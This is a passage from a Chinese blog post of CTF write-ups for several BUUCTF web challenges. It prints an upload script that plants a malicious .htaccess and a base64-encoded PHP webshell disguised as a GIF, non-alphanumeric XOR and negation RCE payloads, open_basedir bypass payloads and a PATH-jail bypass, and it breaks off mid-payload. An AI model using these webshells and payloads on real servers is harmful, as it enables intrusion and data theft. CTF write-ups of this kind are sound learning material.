<pre class="line-numbers language-none"><code class="language-none">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>&#x3D;&#x3D;.htaccess文件上传&#x3D;&#x3D;</p>
<p>利用python脚本上传文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requests
<span class="token keyword">import</span> base64

url <span class="token operator">=</span> <span class="token string">'http://b2e4412f-0209-4b01-b734-0d94367d7f84.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag'</span>
htaccess<span class="token operator">=</span><span class="token triple-quoted-string string">'''#define width 1337
#define height 1337

AddType application/x-httpd-php .ha
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha"'''</span>

files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">'file'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

shell <span class="token operator">=</span> <span class="token string">b"GIF89a12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_POST['shell']);?>"</span><span class="token punctuation">)</span>  <span class="token comment">#GIF89a12里的12是为了符合base64解码规范而添加的</span>

files2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">'file'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'shell.ha'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到路径<code>upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha</code></p>
<p>访问然后蚁剑连接</p>
<p>&#x3D;&#x3D;open_basedir绕过&#x3D;&#x3D;</p>
<blockquote>
<p>这里可以使用蚁剑自带的插件直接拿flag(非预期)</p>
</blockquote>
<p>绕过方法大致如下（php5有其它方法）：</p>
<ul>
<li><p>首先构造一个相对可以上跳的open_basedir 入<code>mkdir(&#39;mayi&#39;); chdir(&#39;mayi&#39;)</code> 当然我们这里有上跳的路径我们直接 <code>chdir(&quot;img&quot;)</code></p>
</li>
<li><p>然后每次操作<code>chdir(&quot;..&quot;)</code>都会进一次open_basedir的比对由于相对路径的问题，每次open_basedir的补全都会上跳。</p>
</li>
<li><p>比如初试open_basedir为&#x2F;a&#x2F;b&#x2F;c&#x2F;d：</p>
</li>
<li><p>第一次chdir后变为&#x2F;a&#x2F;b&#x2F;c，第二次chdir后变为&#x2F;a&#x2F;b，第三次chdir后变为&#x2F;a　第四次chdir后变为&#x2F;</p>
</li>
<li><p>那么这时候再进行ini_set，调整open_basedir为&#x2F;即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">payload1:shell&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));

payload2:shell&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print(readfile(&#39;&#x2F;THis_Is_tHe_F14g&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<hr>
<h4 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h4><p>&#x3D;&#x3D;无数字字母rce&#x3D;&#x3D;</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后就显示了phpinfo</p>
<p>尝试了system()函数，无果。应该是有限制的。</p>
<p>可以利用<code>assert(eval($_POST[cmd]))</code>写🐎</p>
<p>直接取反</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6);&amp;%ff&#x3D;assert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>post传参<code>cmd=phpinfo();</code>成功了</p>
<p>蚁剑连接，但是无法读取文件，直接使用蚁剑的disable_function插件绕过<code>open_basedir</code>限制。</p>
<p>在命令行执行<code>/readflag</code> 拿到flag</p>
<hr>
<h4 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h4><p>提示发送json数据</p>
<p><code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
<p>回显index.php</p>
<ol>
<li>代码中使用<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用<code>/bin/cat</code> 来调用cat命令。</li>
<li>Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</li>
</ol>
<p>&#x3D;&#x3D;%0a绕过正则&#x3D;&#x3D;</p>
<p>payload:</p>
<p>&#96;?cmd&#x3D;</p>

  <p><a class="classtest-link" href="/tags/CTF/" rel="tag">CTF</a> — 2022年3月23日</p>
  


        </div>
        <div class="row mt-2">
  <h3>Search</h3>
  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
  <div style="margin-top: 1.5rem;">
    <ul id="result"></ul>
  </div>
</div>
        <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with ❤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      
      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
      </a>
      

      
      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
      </a>
      

      

    </div>
  
</div>
<script src="/js/prism/prism.js" async></script>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>

  <script>
    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>